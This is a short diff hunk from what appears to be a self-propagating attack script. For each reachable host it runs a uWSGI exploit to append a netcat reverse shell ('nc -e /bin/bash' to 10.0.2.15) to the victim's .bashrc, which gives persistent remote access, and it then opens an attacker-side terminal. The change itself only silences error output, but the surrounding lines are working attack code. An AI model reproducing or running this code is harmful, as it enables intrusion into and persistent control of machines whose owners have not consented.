@@ -45,7 +45,7 @@ do
 		do
 			echo "HOST UP: $ipPropagation. Trying to send reverse-shell"
 			#SEND GET REQUEST 
-			if python3 uwsgi_exp.py -u $ipPropagation -c "echo 'nc -e /bin/bash 10.0.2.15 $portNumber 2>/dev/null &' >> ~/.bashrc" | grep -q "200" ; then
+			if python3 uwsgi_exp.py -u $ipPropagation -c "echo 'nc -e /bin/bash 10.0.2.15 $portNumber 2>/dev/null &' >> ~/.bashrc" 2>/dev/null | grep -q "200" ; then
 				#OPEN TERMINAL ATTACKER SIDE IF COMMAND SUCEED
 				echo "Reverse-shell send"
 				python3 uwsgi_exp.py -u $ipPropagation -c "gnome-terminal" &>/dev/null
